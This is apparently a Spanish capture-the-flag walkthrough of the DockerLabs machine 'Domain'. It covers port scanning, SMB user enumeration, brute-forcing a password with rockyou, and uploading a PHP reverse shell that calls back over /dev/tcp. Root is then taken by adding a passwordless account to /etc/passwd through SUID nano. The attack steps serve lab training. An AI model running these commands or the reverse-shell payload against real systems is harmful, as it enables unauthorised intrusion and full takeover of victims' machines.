#MAQUINA #DOCKERLABS #MEDIO 
#ENUM4LINUX #CRACKMAPEXEC #SMBMAP 
#SMBCLIENT #ABUSO_SUBIDA_ARCHIVOS 

<hr>

# RECONOCIMIENTO

Vamos a resolver **Domain** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 15:06 CET
Initiating ARP Ping Scan at 15:06
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:06, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:06
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 445/tcp on 172.17.0.2
Discovered open port 139/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:06, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-17 15:06:13 CET for 0s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y los puertos **139** y **445** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80,139,445 172.17.0.2                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 15:06 CET
Nmap scan report for 172.17.0.2
Host is up (0.000015s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-17T14:07:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds




```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 15:07 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds


enum4linux 172.17.0.2

 ========================================( Users on 172.17.0.2 )========================================
                                                                                                                                                                                          
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: james    Name: james     Desc:                                                                                                             
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob      Name: bob       Desc: 

user:[james] rid:[0x3e8]
user:[bob] rid:[0x3e9]

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## SMB (445)

Con enum4linux sacamos dos usuarios -> **bob** y **james** . Vamos a ver su contra :
```bash
crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt
SMB         172.17.0.2      445    F57CDA103E88     [+] F57CDA103E88\bob:star 

```

Vamos a ver que podemos ver gracias a **smbmap**:

```bash
 smbmap -H 172.17.0.2 -u bob -p star                

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                    
[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        html                                                    READ, WRITE     HTML Share
        IPC$                                                    NO ACCESS       IPC Service (f57cda103e88 server (Samba, Ubuntu))
[*] Closed 1 connections
```

# EXPLOTACION

Usamos **smbclient** para conectarnos a html:
```bash
smbclient //172.17.0.2/html -U bob                 
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Mar 17 15:21:03 2025
  ..                                  D        0  Thu Apr 11 10:18:47 2024
  index.html                          N     1832  Thu Apr 11 10:21:43 2024

                229727556 blocks of size 1024. 190412032 blocks available
```

Si nos damos cuenta esto es la web y tenemos permisos de escritura.
Vamos a subir una reverse shell:

```bash
<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>
```

YA ESTAMOS COMO WWW-DATA.

# ESCALADA PRIVILEGIOS

Vemos si hay archivos que tienen permisos SUID:
   ```bash
www-data@f57cda103e88:/$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/nano
/usr/lib/dbus-1.0/dbus-daemon-launch-helper


```

Vemos **nano** con permisos SUID, modificamos el `/etc/passwd` :

   ```bash
www-data@f57cda103e88:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
james:x:1001:1001:james,,,:/home/james:/bin/bash
newroot::0:0:newroot:/root:/bin/bash

www-data@f57cda103e88:/$ su newroot
root@f57cda103e88:/# whoami
root
root@f57cda103e88:/# 
```

**YA ESTAMOS COMO ROOT.**